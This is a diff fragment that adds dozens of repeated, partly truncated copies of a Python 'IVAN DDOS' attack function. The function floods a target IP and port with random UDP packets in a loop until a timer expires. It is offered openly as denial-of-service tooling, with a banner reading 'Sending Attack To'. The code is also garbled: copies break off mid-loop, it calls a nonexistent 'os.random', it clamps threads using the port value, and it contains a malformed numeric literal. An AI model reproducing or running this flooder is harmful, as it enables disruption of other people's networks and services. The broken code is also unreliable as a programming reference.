+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+    
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+   
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+ 
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+   
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+ 
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+ 
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+    
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+    
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+   
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+ 
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+   
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
